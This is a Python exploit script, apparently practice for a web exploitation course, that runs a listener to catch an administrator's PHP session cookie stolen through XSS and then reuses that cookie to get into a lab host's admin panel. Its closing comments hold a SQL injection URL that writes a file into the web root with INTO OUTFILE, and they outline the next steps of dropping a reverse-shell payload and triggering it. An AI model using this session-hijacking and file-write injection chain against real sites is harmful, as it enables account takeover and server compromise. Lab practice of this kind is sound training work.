#!/usr/bin/python3

## https://github.com/wetw0rk/AWAE-PREP/tree/master/XSS%20and%20MySQL
## Base template for the python server is here: https://gist.githubusercontent.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7/raw/a6a1d090ac8549dac8f2bd607bd64925de997d40/server.py

#!/usr/bin/env python3
"""
Very simple HTTP server in python for logging requests
Usage::
    ./server.py [<port>]
"""
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import requests


# Class S to server as the http server handler to receive the requests with the admin cookie.
class S(BaseHTTPRequestHandler):
    # Keyword _set_response funtion for the handler class that automatically sends the HTTP response back to the client when receiving an HTTP request.
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    # Keyword do_GET function to performs actions when a GET HTTP request is received.
    def do_GET(self):
        # Print the path of the GET request we receive.
        logging.info("Path: %s\n", str(self.path))

        # Parse the path we receive that contains the admin cookie to store it in the global var_admin_cookie variable.
        var_path = str(self.path)
        # Note that we need the keyword global so that we can pull the variable value from outside this function.
        global var_admin_cookie
        var_admin_cookie = var_path.split('=')[2]
        logging.info("Cookie is %s\n", var_admin_cookie)

        # Send the response to the request to complete the HTTP session.
        self._set_response()

# The exploit function that runs.
def exploit(server_class=HTTPServer, handler_class=S, port=8080):
    logging.basicConfig(level=logging.INFO)

    # 1. Runs the HTTP server to handle the HTTP request we receive.
    ## Runs until we receive 1 HTTP request and then it stops.
    ## We run the server to extract the PHP session ID of the admin.
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd on port %s\n', port)
    try:
        # Handle_request dies after receiving 1 HTTP request.  server_forever() exists until the user kills the program.
        httpd.handle_request()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

    # 2. Authenticate into the website as an admin with the admin cookie we pulled from our HTTP server.
    # Establish a session.
    session = requests.Session()
    # Set the cookies to the PHP session ID that we pulled from the HTTP request we received in our server.
    cookies = {
    "PHPSESSID":var_admin_cookie,
    }
    # Send an HTTP request to the admin panel with our admin cookie to make sure it works.
    response = requests.get('http://192.168.0.228/admin',cookies=cookies,verify=False)



# Main function that runs when executing the script.
if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        exploit(port=int(argv[1]))
    else:
        exploit()


# # TODO:
# 1. Search the response content for keywords like "Logout" to confirm we are logged in as admin.  If we don't see these keywords, then kill the script and notify the user to try again.
##    print("Request headers %s", response.request.headers)
##    print(response.content)
# 2. Send the GET request with exploit code to write to the server.  Ideal to use some exploit code from MSF?
## Exploit GET request to write content to the server in the css folder where we have access.  We just have to do a GET at the dropped location to activate exploit.
## http://192.168.0.228/admin/edit.php?id=0%20union%20select%201,%22file%20written%20successfully!%22,3,4%20into%20outfile%20%27/var/www/css/proof.txt%27

# 3. Set up a listener for the reverse shell to represent a shell.
# 4. Sent GET request to run the exploit code by displaying the web page.
